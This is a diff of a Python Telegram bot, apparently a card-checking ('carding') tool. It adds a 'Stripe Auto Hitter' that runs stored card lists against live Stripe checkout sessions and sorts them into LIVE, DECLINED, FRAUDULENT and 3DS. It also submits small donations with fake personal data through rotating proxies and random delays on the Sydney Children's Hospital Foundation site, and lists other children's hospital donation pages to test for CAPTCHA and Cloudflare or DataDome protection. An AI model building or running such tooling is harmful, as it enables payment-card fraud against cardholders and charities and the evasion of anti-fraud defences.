                 "give-form-id": "1",
                 "give-amount": f"{amount:.2f}",
@@ -1100,16 +1330,13 @@ class AntiBlockGiveWPDonationHandler:
             if proxy_url:
                 async with session.post(f"{self.base_url}/", data=amount_data, proxy=proxy_url, ssl=False) as resp:
                     html2 = await resp.text()
-                    logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
             else:
                 async with session.post(f"{self.base_url}/", data=amount_data) as resp:
                     html2 = await resp.text()
-                    logger.info(f"✅ Cantidad establecida - Status: {resp.status}")
             
             await self._random_delay(2, 4)
             
-            # Paso 3: Generar y enviar datos personales
-            logger.info("📝 Paso 3: Enviando datos personales")
+            # Paso 3: Datos personales
             personal = self.generate_fake_personal_data()
             self.personal_data = personal
             
@@ -1123,16 +1350,13 @@ class AntiBlockGiveWPDonationHandler:
             if proxy_url:
                 async with session.post(f"{self.base_url}/", data=personal_data, proxy=proxy_url, ssl=False) as resp:
                     html3 = await resp.text()
-                    logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
             else:
                 async with session.post(f"{self.base_url}/", data=personal_data) as resp:
                     html3 = await resp.text()
-                    logger.info(f"✅ Datos personales enviados - Status: {resp.status}")
             
             await self._random_delay(2, 4)
             
-            # Paso 4: Enviar dirección
-            logger.info("🏠 Paso 4: Enviando dirección")
+            # Paso 4: Dirección
             address_data = {
                 "billing_address1": personal["address"],
                 "billing_address2": "",
@@ -1145,37 +1369,25 @@ class AntiBlockGiveWPDonationHandler:
             if proxy_url:
                 async with session.post(f"{self.base_url}/", data=address_data, proxy=proxy_url, ssl=False) as resp:
                     html4 = await resp.text()
-                    logger.info(f"✅ Dirección enviada - Status: {resp.status}")
             else:
                 async with session.post(f"{self.base_url}/", data=address_data) as resp:
                     html4 = await resp.text()
-                    logger.info(f"✅ Dirección enviada - Status: {resp.status}")
             
             await self._random_delay(2, 4)
             
-            # Paso 5: Ir a página de pago
-            logger.info("💳 Paso 5: Accediendo a página de pago")
+            # Paso 5: Página de pago
             payment_url = f"{self.base_url}/payment"
             
             if proxy_url:
                 async with session.get(payment_url, proxy=proxy_url, ssl=False) as resp:
                     payment_html = await resp.text()
-                    logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
             else:
                 async with session.get(payment_url) as resp:
                     payment_html = await resp.text()
-                    logger.info(f"✅ Página de pago cargada - Status: {resp.status}, Tamaño: {len(payment_html)} bytes")
-            
-            # Buscar indicadores de Stripe
-            if "stripe" in payment_html.lower():
-                logger.info("💳 Stripe detectado en la página")
-            if "card" in payment_html.lower():
-                logger.info("💳 Formulario de tarjeta detectado")
             
             await self._random_delay(3, 6)
             
-            # Paso 6: Enviar datos de tarjeta
-            logger.info("💳 Paso 6: Enviando datos de tarjeta")
+            # Paso 6: Enviar tarjeta
             cardholder = f"{personal['first_name']} {personal['last_name']}"
             payment_data = {
                 "cardholder_name": cardholder,
@@ -1184,28 +1396,16 @@ class AntiBlockGiveWPDonationHandler:
                 "card_cvc": card_data['cvv'],
             }
             
-            logger.debug(f"Datos de pago: {cardholder}, tarjeta: {card_data['number'][:6]}xxxxxx{card_data['number'][-4:]}")
-            
             if proxy_url:
                 async with session.post(payment_url, data=payment_data, proxy=proxy_url, ssl=False, allow_redirects=True) as pay_resp:
                     elapsed = time.time() - start_time
                     final_text = await pay_resp.text()
-                    logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
             else:
                 async with session.post(payment_url, data=payment_data, allow_redirects=True) as pay_resp:
                     elapsed = time.time() - start_time
                     final_text = await pay_resp.text()
-                    logger.info(f"✅ Pago procesado - Status: {pay_resp.status}, Tiempo: {elapsed:.2f}s")
             
-            logger.info(f"📄 Respuesta (primeros 200 chars): {final_text[:200]}")
-            
-            # Clasificar resultado
             status, confidence, reason, patterns = ResponseClassifier.classify(final_text, pay_resp.status, elapsed)
-            
-            # Extraer precio
-            price = f"${amount:.2f}"
-            
-            logger.info(f"📊 Resultado clasificado: {status.value} - {reason}")
             
             return JobResult(
                 job=Job(
@@ -1222,34 +1422,12 @@ class AntiBlockGiveWPDonationHandler:
                 response_text=final_text[:500],
                 success=(status == CheckStatus.CHARGED),
                 bin_info=await get_bin_info(card_data['bin']),
-                price=price,
+                price=f"${amount:.2f}",
                 patterns_detected=patterns
             )
                 
-        except asyncio.TimeoutError:
-            elapsed = time.time() - start_time
-            logger.error(f"⏱️ TIMEOUT después de {elapsed:.2f}s")
-            return JobResult(
-                job=Job(
-                    site=self.base_url,
-                    proxy=proxy_display if proxy_url else "",
-                    card_data=card_data,
-                    job_id=0
-                ),
-                status=CheckStatus.READ_TIMEOUT,
-                confidence=Confidence.MEDIUM,
-                reason="donation_timeout",
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                success=False,
-                bin_info=await get_bin_info(card_data['bin']),
-                price=f"${amount:.2f}"
-            )
-            
         except Exception as e:
             elapsed = time.time() - start_time
-            logger.error(f"💥 Error en donación: {str(e)}", exc_info=True)
             return JobResult(
                 job=Job(
                     site=self.base_url,
@@ -1269,7 +1447,6 @@ class AntiBlockGiveWPDonationHandler:
             )
     
     async def close(self):
-        """Cierra la sesión"""
         if self.session and not self.session.closed:
             await self.session.close()
 
@@ -1359,7 +1536,6 @@ class ShopifyJobExecutor:
         try:
             api_endpoint = random.choice(Settings.API_ENDPOINTS)
             
-            # Configurar proxy
             proxy_parts = job.proxy.split(':')
             if len(proxy_parts) == 4:
                 proxy_url = f"http://{proxy_parts[2]}:{proxy_parts[3]}@{proxy_parts[0]}:{proxy_parts[1]}"
@@ -1455,22 +1631,23 @@ class UserManager:
 
     async def get_user_data(self, user_id: int) -> Dict:
         row = await self.db.fetch_one(
-            "SELECT sites, proxies, cards, givewp_sites FROM users WHERE user_id = ?",
+            "SELECT sites, proxies, cards, givewp_sites, stripe_urls FROM users WHERE user_id = ?",
             (user_id,)
         )
         
         if not row:
             await self.db.execute(
-                "INSERT INTO users (user_id, sites, proxies, cards, givewp_sites) VALUES (?, ?, ?, ?, ?)",
-                (user_id, '[]', '[]', '[]', '[]')
+                "INSERT INTO users (user_id, sites, proxies, cards, givewp_sites, stripe_urls) VALUES (?, ?, ?, ?, ?, ?)",
+                (user_id, '[]', '[]', '[]', '[]', '[]')
             )
-            return {"sites": [], "proxies": [], "cards": [], "givewp_sites": []}
+            return {"sites": [], "proxies": [], "cards": [], "givewp_sites": [], "stripe_urls": []}
         
         return {
             "sites": json.loads(row["sites"]),
             "proxies": json.loads(row["proxies"]),
             "cards": json.loads(row["cards"]),
-            "givewp_sites": json.loads(row["givewp_sites"]) if row["givewp_sites"] else []
+            "givewp_sites": json.loads(row["givewp_sites"]) if row["givewp_sites"] else [],
+            "stripe_urls": json.loads(row["stripe_urls"]) if row["stripe_urls"] else []
         }
 
     async def update_user_data(self, user_id: int, **kwargs):
@@ -1482,10 +1659,11 @@ class UserManager:
         
         await self.db.execute(
             """UPDATE users SET 
-               sites = ?, proxies = ?, cards = ?, givewp_sites = ?
+               sites = ?, proxies = ?, cards = ?, givewp_sites = ?, stripe_urls = ?
                WHERE user_id = ?""",
             (json.dumps(current["sites"]), json.dumps(current["proxies"]), 
-             json.dumps(current["cards"]), json.dumps(current["givewp_sites"]), user_id)
+             json.dumps(current["cards"]), json.dumps(current["givewp_sites"]),
+             json.dumps(current["stripe_urls"]), user_id)
         )
 
     async def check_rate_limit(self, user_id: int, command: str) -> Tuple[bool, str]:
@@ -1583,74 +1761,269 @@ class CardCheckService:
         return result
 
     async def donate_givewp_anti_block(self, user_id: int, card_data: Dict, amount: float = 5.00) -> JobResult:
-        """Verifica una donación en GiveWP con sistema anti-bloqueo"""
-        logger.info(f"🚀 Iniciando donación anti-bloqueo para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
+        logger.info(f"🚀 Iniciando donación para tarjeta {card_data['bin']}xxxxxx{card_data['last4']}, monto ${amount}")
         
-        # Obtener proxies del usuario
         user_data = await self.user_manager.get_user_data(user_id)
         proxies = user_data.get("proxies", [])
         
-        if not proxies:
-            logger.warning("⚠️ No hay proxies disponibles, se usará conexión directa")
-        
-        start_time = time.time()
-        
         handler = AntiBlockGiveWPDonationHandler(user_id, proxies, Settings.GIVEWP_SESSION_COOKIE)
         try:
-            logger.info("⏳ Ejecutando complete_donation anti-bloqueo...")
             result = await handler.complete_donation(amount, card_data)
-            
-            elapsed = time.time() - start_time
-            logger.info(f"✅ Donación completada en {elapsed:.2f}s - Status: {result.status.value}")
-            
             await self.db.save_result(user_id, result, "givewp")
             return result
-            
-        except asyncio.TimeoutError:
-            elapsed = time.time() - start_time
-            logger.error(f"⏱️ TIMEOUT en donación después de {elapsed:.2f}s")
-            return JobResult(
-                job=Job(
-                    site=handler.base_url,
-                    proxy="",
-                    card_data=card_data,
-                    job_id=0
-                ),
-                status=CheckStatus.READ_TIMEOUT,
-                confidence=Confidence.MEDIUM,
-                reason="donation_timeout",
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                success=False,
-                bin_info=await get_bin_info(card_data['bin']),
-                price=f"${amount:.2f}"
-            )
-            
-        except Exception as e:
-            elapsed = time.time() - start_time
-            logger.error(f"💥 Error en donación: {str(e)}", exc_info=True)
-            return JobResult(
-                job=Job(
-                    site=handler.base_url,
-                    proxy="",
-                    card_data=card_data,
-                    job_id=0
-                ),
-                status=CheckStatus.UNKNOWN,
-                confidence=Confidence.LOW,
-                reason=f"error: {str(e)[:50]}",
-                response_time=elapsed,
-                http_code=None,
-                response_text="",
-                success=False,
-                bin_info=await get_bin_info(card_data['bin']),
-                price=f"${amount:.2f}"
-            )
         finally:
             await handler.close()
 
-# ================== NUEVOS COMANDOS DE ANÁLISIS ==================
+    async def stripe_hit(self, user_id: int, url_index: int) -> Tuple[List[StripeHitResult], Dict[str, int]]:
+        """Ejecuta Stripe Auto Hitter"""
+        
+        user_data = await self.user_manager.get_user_data(user_id)
+        urls = user_data.get("stripe_urls", [])
+        cards = [CardValidator.parse_card(c) for c in user_data.get("cards", []) if CardValidator.parse_card(c)]
+        proxies = user_data.get("proxies", [])
+        
+        if not urls or url_index >= len(urls):
+            return [], {}
+        
+        target_url = urls[url_index]['url']
+        
+        hitter = StripeAutoHitter(proxies)
+        results = await hitter.hit_checkout(target_url, cards)
+        
+        # Guardar resultados
+        for r in results:
+            await self.db.save_stripe_result(user_id, r, target_url)
+        
+        # Estadísticas
+        stats = {
+            'live': sum(1 for r in results if r.status == 'LIVE'),
+            'declined': sum(1 for r in results if r.status == 'DECLINED'),
+            'fraudulent': sum(1 for r in results if r.status == 'FRAUDULENT'),
+            'three_ds': sum(1 for r in results if r.three_ds),
+            'error': sum(1 for r in results if r.status not in ['LIVE', 'DECLINED', 'FRAUDULENT'] and not r.three_ds)
+        }
+        
+        return results, stats
+
+# ================== NUEVOS COMANDOS DE STRIPE ==================
+active_hits = {}  # user_id -> bool para controlar hits activos
+
+async def add_stripe_url(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Guarda una URL de Stripe Checkout"""
+    user_id = update.effective_user.id
+    
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Uso: /addstripe <url>\n"
+            "Ejemplo: /addstripe https://checkout.stripe.com/c/pay/cs_live_..."
+        )
+        return
+    
+    url = context.args[0]
+    
+    # Validar que sea URL de Stripe
+    if 'stripe.com' not in url or 'cs_live_' not in url:
+        await update.message.reply_text("❌ URL de Stripe inválida (debe contener cs_live_)")
+        return
+    
+    user_data = await user_manager.get_user_data(user_id)
+    
+    # Intentar extraer nombre del sitio
+    site_name = "Stripe Checkout"
+    amount = "??"
+    
+    # Extraer posible nombre del sitio del hash
+    if '#' in url:
+        hash_part = url.split('#')[-1]
+        try:
+            decoded = base64.b64decode(hash_part + '==').decode('utf-8', errors='ignore')
+            # Buscar nombre en el hash decodificado
+            site_match = re.search(r'site_name["\']?:?\s*["\']([^"\']+)', decoded)
+            if site_match:
+                site_name = site_match.group(1)
+            # Buscar monto
+            amount_match = re.search(r'amount["\']?:?\s*["\']?(\d+)', decoded)
+            if amount_match:
+                amount = f"${int(amount_match.group(1))/100:.2f}"
+        except:
+            pass
+    
+    user_data['stripe_urls'].append({
+        'url': url,
+        'site': site_name,
+        'amount': amount,
+        'added': datetime.now().isoformat(),
+        'hits': 0,
+        'lives': 0
+    })
+    
+    await user_manager.update_user_data(user_id, stripe_urls=user_data['stripe_urls'])
+    
+    await update.message.reply_text(
+        f"✅ URL de Stripe guardada\n"
+        f"📍 Sitio: {site_name}\n"
+        f"💰 Monto: {amount}"
+    )
+
+async def list_stripe_urls(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Lista las URLs de Stripe guardadas"""
+    user_id = update.effective_user.id
+    user_data = await user_manager.get_user_data(user_id)
+    
+    urls = user_data.get('stripe_urls', [])
+    
+    if not urls:
+        await update.message.reply_text("📭 No tienes URLs de Stripe guardadas")
+        return
+    
+    lines = ["💳 *TUS URLS DE STRIPE*", "━━━━━━━━━━━━━━━━━━", ""]
+    for i, u in enumerate(urls, 1):
+        lines.append(f"{i}. *{u.get('site', 'Stripe')}*")
+        lines.append(f"   💰 {u.get('amount', '??')}")
+        lines.append(f"   🔗 {u['url'][:60]}...")
+        lines.append(f"   📊 Hits: {u.get('hits', 0)} | Lives: {u.get('lives', 0)}")
+        lines.append("")
+    
+    await update.message.reply_text("\n".join(lines), parse_mode="Markdown")
+
+async def hit_stripe(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Inicia el proceso de hitting en una URL de Stripe - RESULTADOS REALES como en la captura"""
+    user_id = update.effective_user.id
+    
+    if not context.args:
+        await update.message.reply_text(
+            "❌ Uso: /hit <número_url>\n"
+            "Ejemplo: /hit 1 (para usar la primera URL)"
+        )
+        return
+    
+    try:
+        url_index = int(context.args[0]) - 1
+    except:
+        await update.message.reply_text("❌ Número inválido")
+        return
+    
+    user_data = await user_manager.get_user_data(user_id)
+    urls = user_data.get('stripe_urls', [])
+    cards = user_data.get('cards', [])
+    proxies = user_data.get('proxies', [])
+    
+    if not urls:
+        await update.message.reply_text("❌ Primero guarda URLs con /addstripe")
+        return
+    
+    if url_index < 0 or url_index >= len(urls):
+        await update.message.reply_text("❌ Número de URL inválido")
+        return
+    
+    if not cards:
+        await update.message.reply_text("❌ Primero sube tarjetas")
+        return
+    
+    if not proxies:
+        await update.message.reply_text("❌ Necesitas proxies para evitar bloqueos")
+        return
+    
+    target_url = urls[url_index]
+    
+    # Extraer información básica
+    session_id = re.search(r'cs_live_[a-zA-Z0-9]+', target_url['url'])
+    session_display = session_id.group(0) if session_id else "desconocido"
+    
+    # Mensaje de inicio
+    msg = await update.message.reply_text(
+        f"🚀 *AUTO HIT INICIADO*\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"📍 Sitio: {target_url.get('site', 'Stripe')}\n"
+        f"💰 Monto: {target_url.get('amount', '??')}\n"
+        f"🔗 Sesión: `{session_display}`\n"
+        f"💳 Tarjetas: {len(cards)}\n"
+        f"🔄 Proxies: {len(proxies)}\n\n"
+        f"⏳ Procesando..."
+    )
+    
+    # Marcar hit activo
+    active_hits[user_id] = True
+    
+    # Ejecutar hits
+    service = CardCheckService(db, user_manager)
+    results, stats = await service.stripe_hit(user_id, url_index)
+    
+    if not active_hits.get(user_id, False):
+        await msg.edit_text("⏹ Proceso detenido por el usuario")
+        return
+    
+    # Actualizar estadísticas en la URL
+    urls[url_index]['hits'] = urls[url_index].get('hits', 0) + len(results)
+    urls[url_index]['lives'] = urls[url_index].get('lives', 0) + stats['live']
+    await user_manager.update_user_data(user_id, stripe_urls=urls)
+    
+    # Formatear resultados como en la captura
+    response = []
+    response.append(f"📊 *RESULTADOS AUTO HIT*\n━━━━━━━━━━━━━━━━━━\n")
+    response.append(f"Probadas: {len(results)}/{len(cards)} tarjetas")
+    response.append(f"Monto: {target_url.get('amount', '??')}")
+    response.append(f"Sitio: {target_url.get('site', 'Stripe')}\n")
+    
+    # Mostrar cada resultado
+    for r in results[:15]:  # Mostrar máximo 15 para no exceder límite de Telegram
+        emoji = "✅" if r.status == 'LIVE' else "🔒" if r.three_ds else "❌" if r.status == 'DECLINED' else "🚨" if r.status == 'FRAUDULENT' else "⚠️"
+        card_display = f". . . {r.card_last4}" if len(r.card_last4) == 4 else r.card_last4
+        
+        if r.three_ds:
+            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – 3DS: {r.reason}")
+        elif r.status == 'FRAUDULENT':
+            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Failed: {r.reason}")
+        elif r.status == 'LIVE':
+            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – LIVE: {r.reason}")
+        elif r.status == 'DECLINED':
+            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Declined: {r.reason}")
+        else:
+            response.append(f"{emoji} {card_display} (Stripe Auth $0.1) – Error: {r.reason}")
+    
+    if len(results) > 15:
+        response.append(f"... y {len(results)-15} más")
+    
+    # Resumen
+    response.append(f"\n📈 *RESUMEN*")
+    response.append(f"✅ LIVE: {stats['live']}")
+    response.append(f"❌ DECLINED: {stats['declined']}")
+    response.append(f"🚨 FRAUDULENT: {stats['fraudulent']}")
+    response.append(f"🔒 3DS: {stats['three_ds']}")
+    response.append(f"⚠️ ERRORES: {stats['error']}")
+    
+    await msg.edit_text("\n".join(response), parse_mode="Markdown")
+    
+    # Limpiar estado
+    active_hits.pop(user_id, None)
+
+async def stop_hit(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Detiene el proceso de hitting en curso"""
+    user_id = update.effective_user.id
+    
+    if user_id in active_hits:
+        active_hits[user_id] = False
+        await update.message.reply_text("⏹ Deteniendo proceso de Auto Hit...")
+    else:
+        await update.message.reply_text("No hay proceso de Auto Hit activo")
+
+async def stripe_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    """Muestra estadísticas de Stripe"""
+    user_id = update.effective_user.id
+    stats = await db.get_stats(user_id)
+    
+    text = (
+        f"📊 *ESTADÍSTICAS STRIPE*\n"
+        f"━━━━━━━━━━━━━━━━━━\n\n"
+        f"✅ LIVE: {stats['stripe_live']}\n"
+        f"❌ DECLINED: {stats['stripe_declined']}\n"
+        f"🚨 FRAUDULENT: {stats['stripe_fraud']}\n"
+        f"🔒 3DS: {stats['stripe_3ds']}"
+    )
+    
+    await update.message.reply_text(text, parse_mode="Markdown")
+
+# ================== COMANDOS DE ANÁLISIS ==================
 async def analyze_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Analiza un sitio web en busca de CAPTCHA"""
     user_id = update.effective_user.id
@@ -1672,13 +2045,11 @@ async def analyze_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
         await msg.edit_text(f"❌ Error: {result.get('error', 'Desconocido')}")
         return
     
-    # Formatear resultado
     response = []
     response.append(f"🔍 *ANÁLISIS DE SITIO*\n━━━━━━━━━━━━━━━━━━\n")
     response.append(f"📍 URL: `{result['url']}`")
     response.append(f"📊 Status: {result['status_code']} ({result['response_time']:.2f}s)")
     
-    # Resultado de CAPTCHA
     captcha = result['captcha']
     if captcha['has_captcha']:
         response.append(f"\n🚫 *CAPTCHA DETECTADO*")
@@ -1689,7 +2060,6 @@ async def analyze_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         response.append(f"\n✅ *NO SE DETECTARON CAPTCHAS*")
     
-    # Headers de seguridad
     headers = result['security_headers']
     if headers['has_security_headers']:
         response.append(f"\n🛡️ *PROTECCIÓN DETECTADA*")
@@ -1697,30 +2067,20 @@ async def analyze_site(update: Update, context: ContextTypes.DEFAULT_TYPE):
             response.append(f"• Cloudflare")
         if headers['datadome']:
             response.append(f"• DataDome")
-        if headers['akamai']:
-            response.append(f"• Akamai")
     
-    # Recomendación
     response.append(f"\n💡 *RECOMENDACIÓN*")
     response.append(f"{result['recommendation']}")
-    
-    # Servicios de resolución (debug)
-    if result['resolution_services']:
-        response.append(f"\n🔧 *Servicios de resolución detectados*")
-        for svc in result['resolution_services']:
-            response.append(f"• {svc}")
     
     await msg.edit_text("\n".join(response), parse_mode="Markdown")
 
 async def find_similar_sites(update: Update, context: ContextTypes.DEFAULT_TYPE):
     """Busca sitios similares al actual (hospitales infantiles)"""
     
-    # Lista de sitios de hospitales infantiles (basado en búsqueda)
     hospitals = [
         {
             'name': 'Royal Children\'s Hospital Foundation (Australia)',
             'url': 'https://www.rchfoundation.org.au',
-            'note': 'Mismo país que el actual, probablemente sin captcha'
+            'note': 'Mismo país que el actual'
         },
         {
             'name': 'St. Jude Children\'s Research Hospital (EE.UU.)',
@@ -1730,22 +2090,7 @@ async def find_similar_sites(update: Update, context: ContextTypes.DEFAULT_TYPE)
         {
             'name': 'BC Children\'s Hospital Foundation (Canadá)',
             'url': 'https://secure.bcchf.ca/donate',
-            'note': 'Sistema canadiense de donaciones'
-        },
-        {
-            'name': 'Texas Children\'s Hospital',
-            'url': 'https://www.texaschildrens.org/support',
-            'note': 'Sistema propio'
-        },
-        {
-            'name': 'Children\'s Minnesota',
-            'url': 'https://www.childrensmn.org/support-childrens',
-            'note': 'Sistema de salud sin fines de lucro'
-        },
-        {
-            'name': 'Alberta Children\'s Hospital Foundation',
-            'url': 'https://www.childrenshospital.ab.ca/ways-to-help/donate',
-            'note': 'Aceptan donaciones internacionales'
+            'note': 'Sistema canadiense'
         },
         {
             'name': 'Sydney Children\'s Hospital (actual)',
@@ -1756,15 +2101,13 @@ async def find_similar_sites(update: Update, context: ContextTypes.DEFAULT_TYPE)
     
     response = []
     response.append("🏥 *HOSPITALES INFANTILES PARA PROBAR*\n")
-    response.append("Estos sitios son similares al que ya usas:\n")
+    response.append("Usa `/analyze <url>` para verificar CAPTCHA:\n")
     
     for i, hospital in enumerate(hospitals, 1):
         response.append(f"{i}. *{hospital['name']}*")
         response.append(f"   🔗 {hospital['url']}")
         response.append(f"   💡 {hospital['note']}")
         response.append("")
-    
-    response.append("Usa `/analyze <url>` para verificar si tienen CAPTCHA")
     
     await update.message.reply_text("\n".join(response), parse_mode="Markdown")
 
@@ -1779,7 +2122,7 @@ active_mass = set()
 # ================== MENÚ PRINCIPAL ==================
 async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edit: bool = False):
     text = (
-        "🤖 *SHOPIFY + GIVEWP CHECKER*\n"
+        "🤖 *SHOPIFY + GIVEWP + STRIPE*\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
         "Elige una opción:"
     )
@@ -1788,6 +2131,7 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edi
         [InlineKeyboardButton("💳 CHECK SHOPIFY", callback_data="menu_check")],
         [InlineKeyboardButton("📦 MASS CHECK", callback_data="menu_mass")],
         [InlineKeyboardButton("❤️ DONATE GIVEWP", callback_data="menu_donate")],
+        [InlineKeyboardButton("⚡ STRIPE AUTO HIT", callback_data="menu_stripe")],
         [InlineKeyboardButton("🌐 SITES", callback_data="menu_sites")],
         [InlineKeyboardButton("🔌 PROXIES", callback_data="menu_proxies")],
         [InlineKeyboardButton("🧾 CARDS", callback_data="menu_cards")],
@@ -1805,16 +2149,18 @@ async def show_main_menu(update: Update, context: ContextTypes.DEFAULT_TYPE, edi
     else:
         await update.message.reply_text(text, parse_mode="Markdown", reply_markup=reply_markup)
 
-# ================== SUBMENÚ ANALYZER ==================
-async def show_analyzer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+# ================== SUBMENÚ STRIPE ==================
+async def show_stripe_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
-        "🔍 *HERRAMIENTA DE ANÁLISIS*\n"
+        "⚡ *STRIPE AUTO HITTER*\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "Analiza sitios web para detectar CAPTCHA:\n\n"
-        "• `/analyze <url>` - Analizar un sitio específico\n"
-        "• `/findsites` - Ver sitios recomendados\n\n"
-        "Ejemplo:\n"
-        "`/analyze https://donate.schf.org.au`"
+        "Comandos:\n"
+        "• `/addstripe <url>` - Guardar URL de Stripe\n"
+        "• `/mystripe` - Ver URLs guardadas\n"
+        "• `/hit <número>` - Iniciar Auto Hit\n"
+        "• `/stophit` - Detener proceso\n"
+        "• `/stripestats` - Ver estadísticas\n\n"
+        "💡 *Resultados reales:* LIVE, DECLINED, FRAUDULENT, 3DS"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -1828,14 +2174,12 @@ async def show_donate_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
     text = (
         "❤️ *DONACIONES GIVEWP*\n"
         "━━━━━━━━━━━━━━━━━━\n\n"
-        "Sydney Children's Hospital Foundation\n"
-        "Donaciones con tarjeta vía Stripe\n\n"
-        "Comandos rápidos:\n"
+        "Sydney Children's Hospital Foundation\n\n"
+        "Comandos:\n"
         "/donate5  - Donar $5\n"
         "/donate10 - Donar $10\n"
         "/donate20 - Donar $20\n"
-        "/donate [monto] [nro_tarjeta] - Cantidad personalizada\n\n"
-        "💡 *Nuevo:* Sistema anti-bloqueo con proxies rotativos"
+        "/donate [monto] [nro_tarjeta] - Cantidad personalizada"
     )
     
     keyboard = [
@@ -1952,27 +2296,19 @@ async def show_cards_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
 # ================== SUBMENÚ STATS ==================
 async def show_stats(update: Update, context: ContextTypes.DEFAULT_TYPE):
     user_id = update.effective_user.id
-    
-    rows = await db.fetch_all(
-        "SELECT gateway, COUNT(*) as count FROM results WHERE user_id = ? GROUP BY gateway",
-        (user_id,)
-    )
-    
-    shopify_count = 0
-    givewp_count = 0
-    
-    for row in rows:
-        if row["gateway"] == "shopify":
-            shopify_count = row["count"]
-        elif row["gateway"] == "givewp":
-            givewp_count = row["count"]
+    stats = await db.get_stats(user_id)
     
     text = (
         f"📊 *ESTADÍSTICAS*\n"
         f"━━━━━━━━━━━━━━━━━━\n\n"
-        f"Total checks: {shopify_count + givewp_count}\n"
-        f"🛍️ Shopify: {shopify_count}\n"
-        f"❤️ GiveWP: {givewp_count}"
+        f"*SHOPIFY:*\n"
+        f"✅ Charged: {stats['charged']}\n"
+        f"❌ Declined: {stats['declined']}\n\n"
+        f"*STRIPE:*\n"
+        f"✅ LIVE: {stats['stripe_live']}\n"
+        f"❌ DECLINED: {stats['stripe_declined']}\n"
+        f"🚨 FRAUDULENT: {stats['stripe_fraud']}\n"
+        f"🔒 3DS: {stats['stripe_3ds']}"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -1993,7 +2329,7 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         f"Workers: {Settings.MAX_WORKERS_PER_USER}\n"
         f"Rate limit: {Settings.RATE_LIMIT_SECONDS}s\n"
         f"Daily limit: {Settings.DAILY_LIMIT_CHECKS}\n"
-        f"Proxies rotativos: ✅ Activado"
+        f"Stripe Auth: ${Settings.STRIPE_AUTH_AMOUNT}"
     )
     
     keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
@@ -2002,16 +2338,31 @@ async def show_settings(update: Update, context: ContextTypes.DEFAULT_TYPE):
         text, parse_mode="Markdown", reply_markup=reply_markup
     )
 
-# ================== FUNCIÓN DONATE CORREGIDA ==================
+# ================== SUBMENÚ ANALYZER ==================
+async def show_analyzer_menu(update: Update, context: ContextTypes.DEFAULT_TYPE):
+    text = (
+        "🔍 *HERRAMIENTA DE ANÁLISIS*\n"
+        "━━━━━━━━━━━━━━━━━━\n\n"
+        "Analiza sitios web para detectar CAPTCHA:\n\n"
+        "• `/analyze <url>` - Analizar un sitio\n"
+        "• `/findsites` - Ver sitios recomendados\n\n"
+        "Ejemplo:\n"
+        "`/analyze https://donate.schf.org.au`"
+    )
+    
+    keyboard = [[InlineKeyboardButton("🔙 Back", callback_data="menu_main")]]
+    reply_markup = InlineKeyboardMarkup(keyboard)
+    await update.callback_query.edit_message_text(
+        text, parse_mode="Markdown", reply_markup=reply_markup
+    )
+
+# ================== FUNCIÓN DONATE ==================
 async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
-    """Donación GiveWP con tarjeta (maneja mensajes y callbacks)"""
     user_id = update.effective_user.id
     
-    # Determinar si es callback o mensaje directo
     is_callback = update.callback_query is not None
     message = update.message if not is_callback else update.callback_query.message
     
-    # Obtener tarjeta
     user_data = await user_manager.get_user_data(user_id)
     cards = user_data.get("cards", [])
     
@@ -2023,7 +2374,6 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(text)
         return
     
-    # Determinar cantidad (por defecto $5)
     amount = 5.00
     card_index = 0
     
@@ -2058,12 +2408,10 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
             await update.message.reply_text(text)
         return
     
-    # Mensaje de progreso
     proxy_count = len(user_data.get("proxies", []))
     progress_text = (
-        f"🔄 Procesando donación de ${amount:.2f} en Sydney Children's Hospital...\n"
-        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}\n"
-        f"🔄 Proxies disponibles: {proxy_count} (rotación activa)"
+        f"🔄 Procesando donación de ${amount:.2f}...\n"
+        f"💳 Tarjeta #{card_index+1}: {card_data['bin']}xxxxxx{card_data['last4']}"
     )
     
     if is_callback:
@@ -2072,56 +2420,40 @@ async def donate(update: Update, context: ContextTypes.DEFAULT_TYPE):
     else:
         msg = await update.message.reply_text(progress_text)
     
-    # Realizar donación con anti-bloqueo
     result = await card_service.donate_givewp_anti_block(user_id, card_data, amount)
     
     emoji = get_status_emoji(result.status)
     confidence_icon = get_confidence_icon(result.confidence)
     
-    # Escapar caracteres especiales para Markdown
     reason_escaped = escape_markdown(result.reason)
